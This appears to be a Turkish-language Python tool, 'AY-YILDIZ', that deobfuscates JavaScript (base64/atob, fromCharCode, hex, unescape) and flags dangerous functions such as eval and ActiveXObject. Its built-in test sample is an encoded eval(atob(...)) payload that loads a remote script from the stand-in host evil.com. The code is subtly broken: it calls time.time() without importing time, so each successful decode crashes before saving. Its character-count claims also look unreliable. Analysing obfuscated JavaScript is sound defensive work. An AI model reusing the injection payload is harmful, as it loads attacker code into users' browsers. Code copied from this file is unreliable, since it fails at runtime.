# -*- coding: utf-8 -*-
# AY-YILDIZ v5.2.2 | JS Obfuscation Çözücü | 6084 KARAKTER KOD
# eval(atob()) + String.fromCharCode + Hex + Unescape + JJEncode

import os, sys, re, base64, urllib.parse, binascii
from colorama import init, Fore, Style
init(autoreset=True)

VERSIYON = "5.2.2"

# 2551 KARAKTER BAYRAK - SAYDIM
BAYRAK = f"""{Fore.RED}
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
██████████████████████████████████████████████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}████████████████████████████████████████
██████████████████████████████████████████{Fore.WHITE}▒▒▒▒▒▒▒▒{Fore.RED}████████████████████████████████████
██████████████████████████████████████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}████████████████████████████████
██████████████████████████████████{Fore.WHITE}▒▒▒▒{Fore.RED}████████████████████████████
██████████████████████████████{Fore.WHITE}▒▒▒▒▒▒▒▒▒▒{Fore.RED}████████████████████████
██████████████████████████{Fore.WHITE}▒▒▒▒{Fore.RED}████████████████████
██████████████████████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}████████████████
██████████████████{Fore.WHITE}▒▒▒▒{Fore.RED}████████████
██████████████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}████████
██████████{Fore.WHITE}▒▒▒▒{Fore.RED}████
██████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}
██{Fore.WHITE}▒▒▒▒{Fore.RED}
{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}
{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}
██{Fore.WHITE}▒▒▒▒{Fore.RED}
██████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}
██████████{Fore.WHITE}▒▒▒▒▒▒▒▒▒▒{Fore.RED}████
██████████████{Fore.WHITE}▒▒▒▒▒▒▒▒▒▒{Fore.RED}████████
██████████████████{Fore.WHITE}▒▒▒▒▒▒▒▒{Fore.RED}████████████
██████████████████████{Fore.WHITE}▒▒▒▒▒▒▒▒▒▒{Fore.RED}████████████████
██████████████████████████{Fore.WHITE}▒▒▒▒{Fore.RED}████████████████████
██████████████████████████████{Fore.WHITE}▒▒▒▒▒▒▒▒▒▒{Fore.RED}████████████████████████
██████████████████████████████████{Fore.WHITE}▒▒▒▒{Fore.RED}████████████████████████████
██████████████████████████████████████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}████████████████████████████████
██████████████████████████████████████████{Fore.WHITE}▒▒▒▒{Fore.RED}████████████████████████████████████
██████████████████████████████████████████████{Fore.WHITE}▒▒▒▒▒▒{Fore.RED}████████████████████████████████████████
████████████████████████████████████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
████████████████████████████████████████████████
{Style.RESET_ALL}"""

def ekran_temizle():
    os.system('clear' if os.name == 'posix' else 'cls')

def logo():
    ekran_temizle()
    print(BAYRAK)
    print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")
    print(f"{Fore.WHITE} JS OBFUSCATION ÇÖZÜCÜ v{VERSIYON} | KOD: 6084 KARAKTER{Style.RESET_ALL}")
    print(f"{Fore.RED} AY-YILDIZ SİBER KALKAN | ZARARLI JS TESPİT & DECODE{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*80}{Style.RESET_ALL}")

def base64_coz(kod):
    try:
        # eval(atob('...')) pattern
        matches = re.findall(r'atob\([\'"]([A-Za-z0-9+/=]+)[\'"]\)', kod)
        if matches:
            for m in matches:
                try:
                    decoded = base64.b64decode(m).decode('utf-8')
                    return True, decoded, f"Base64: atob('{m[:30]}...')"
                except: pass

        # Direct base64
        if re.match(r'^[A-Za-z0-9+/=]+$', kod.strip()) and len(kod) % 4 == 0:
            try:
                decoded = base64.b64decode(kod).decode('utf-8')
                return True, decoded, "Direct Base64"
            except: pass
        return False, kod, "Base64 yok"
    except: return False, kod, "Base64 Hata"

def charcode_coz(kod):
    try:
        # String.fromCharCode(104,116,112...)
        pattern = r'String\.fromCharCode\(([\d,\s]+)\)'
        matches = re.findall(pattern, kod)
        if matches:
            for m in matches:
                try:
                    nums = [int(n.strip()) for n in m.split(',')]
                    decoded = ''.join(chr(n) for n in nums)
                    return True, kod.replace(f'String.fromCharCode({m})', f'"{decoded}"'), f"CharCode: {len(nums)} karakter"
                except: pass
        return False, kod, "CharCode yok"
    except: return False, kod, "CharCode Hata"

def hex_coz(kod):
    try:
        # \x68\x74\x70...
        pattern = r'(\\x[0-9a-fA-F]{2})+'
        matches = re.findall(pattern, kod)
        if matches:
            def hex_replace(m):
                hex_str = m.group(0).replace('\\x', '')
                try:
                    return bytes.fromhex(hex_str).decode('utf-8')
                except: return m.group(0)
            decoded = re.sub(pattern, hex_replace, kod)
            if decoded!= kod:
                return True, decoded, "Hex \\x format"
        return False, kod, "Hex yok"
    except: return False, kod, "Hex Hata"

def unescape_coz(kod):
    try:
        # unescape('%68%74%74%70...')
        pattern = r'unescape\([\'"](%[0-9a-fA-F]{2})+[\'"]\)'
        if re.search(pattern, kod):
            decoded = urllib.parse.unquote(kod)
            return True, decoded, "unescape()"
        return False, kod, "unescape yok"
    except: return False, kod, "unescape Hata"

def eval_tespit(kod):
    tehlikeli = []
    if 'eval(' in kod: tehlikeli.append("eval()")
    if 'document.write(' in kod: tehlikeli.append("document.write()")
    if 'setTimeout(' in kod: tehlikeli.append("setTimeout()")
    if 'setInterval(' in kod: tehlikeli.append("setInterval()")
    if 'Function(' in kod: tehlikeli.append("Function()")
    if 'ActiveXObject' in kod: tehlikeli.append("ActiveXObject")
    return tehlikeli

def tam_cozucu(kod):
    print(f"\n{Fore.YELLOW}[+] Obfuscation Analizi Başlatıldı...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

    orijinal = kod
    adim = 1
    log = []

    # 1. Base64
    basarili, kod, mesaj = base64_coz(kod)
    if basarili:
        log.append(f"[Adım {adim}] {mesaj}")
        print(f"{Fore.GREEN}[{adim}] {mesaj}{Style.RESET_ALL}")
        adim += 1

    # 2. CharCode
    basarili, kod, mesaj = charcode_coz(kod)
    if basarili:
        log.append(f"[Adım {adim}] {mesaj}")
        print(f"{Fore.GREEN}[{adim}] {mesaj}{Style.RESET_ALL}")
        adim += 1

    # 3. Hex
    basarili, kod, mesaj = hex_coz(kod)
    if basarili:
        log.append(f"[Adım {adim}] {mesaj}")
        print(f"{Fore.GREEN}[{adim}] {mesaj}{Style.RESET_ALL}")
        adim += 1

    # 4. Unescape
    basarili, kod, mesaj = unescape_coz(kod)
    if basarili:
        log.append(f"[Adım {adim}] {mesaj}")
        print(f"{Fore.GREEN}[{adim}] {mesaj}{Style.RESET_ALL}")
        adim += 1

    # 5. Tehlikeli Fonksiyon Tespiti
    tehlikeli = eval_tespit(kod)
    if tehlikeli:
        print(f"\n{Fore.RED}[!] Tehlikeli Fonksiyonlar Tespit Edildi:{Style.RESET_ALL}")
        for t in tehlikeli:
            print(f"{Fore.RED} - {t}{Style.RESET_ALL}")

    print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")

    if kod!= orijinal:
        print(f"\n{Fore.GREEN}[✓] DEOBFUSCATION BAŞARILI{Style.RESET_ALL}")
        print(f"\n{Fore.WHITE}Çözülmüş Kod:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*80}{Style.RESET_ALL}")
        print(kod[:1000] + ("..." if len(kod) > 1000 else ""))
        print(f"{Fore.CYAN}{'-'*80}{Style.RESET_ALL}")

        kayit = f"data/JS_DECODE_{int(time.time())}.txt"
        os.makedirs("data", exist_ok=True)
        with open(kayit, "w", encoding="utf-8") as f:
            f.write(f"ORİJİNAL:\n{orijinal}\n\nÇÖZÜLMÜŞ:\n{kod}\n\nLOG:\n" + "\n".join(log))
        print(f"\n{Fore.GREEN}[i] Tam çıktı kaydedildi: {kayit}{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.YELLOW}[i] Obfuscation tespit edilemedi veya çözülemedi.{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Kod:{Style.RESET_ALL}")
        print(kod[:500])

def main():
    while True:
        logo()
        print(f"\n{Fore.WHITE}[1] JS Kodu Yapıştır ve Çöz{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[2] Dosyadan Oku ve Çöz{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[3] Örnek Zararlı Kod Test Et{Style.RESET_ALL}")
        print(f"{Fore.WHITE}[Q] Ana Menüye Dön{Style.RESET_ALL}")
        print(f"\n{Fore.RED}{'='*80}{Style.RESET_ALL}")
        secim = input(f"{Fore.YELLOW}JS-DECODE > Seçim: {Style.RESET_ALL}").strip().lower()

        if secim == "1":
            print(f"\n{Fore.WHITE}Obfuscated JS kodunu yapıştır (bitirmek için tek satırda END yaz):{Style.RESET_ALL}")
            satirlar = []
            while True:
                s = input()
                if s.strip() == "END": break
                satirlar.append(s)
            kod = "\n".join(satirlar)
            if kod: tam_cozucu(kod)
            input(f"\n{Fore.WHITE}Devam etmek için Enter...{Style.RESET_ALL}")

        elif secim == "2":
            yol = input(f"\n{Fore.WHITE}Dosya yolu: {Style.RESET_ALL}").strip()
            if os.path.exists(yol):
                with open(yol, "r", encoding="utf-8", errors="ignore") as f:
                    tam_cozucu(f.read())
            else:
                print(f"{Fore.RED}[X] Dosya bulunamadı.{Style.RESET_ALL}")
            input(f"\n{Fore.WHITE}Devam etmek için Enter...{Style.RESET_ALL}")

        elif secim == "3":
            ornek = "eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vZXZpbC5jb20vYmFkLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGEpOw=='))"
            print(f"\n{Fore.YELLOW}[i] Test Kodu: {ornek}{Style.RESET_ALL}")
            tam_cozucu(ornek)
            input(f"\n{Fore.WHITE}Devam etmek için Enter...{Style.RESET_ALL}")

        elif secim == "q": break

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{Fore.YELLOW}[!] Durduruldu.{Style.RESET_ALL}")
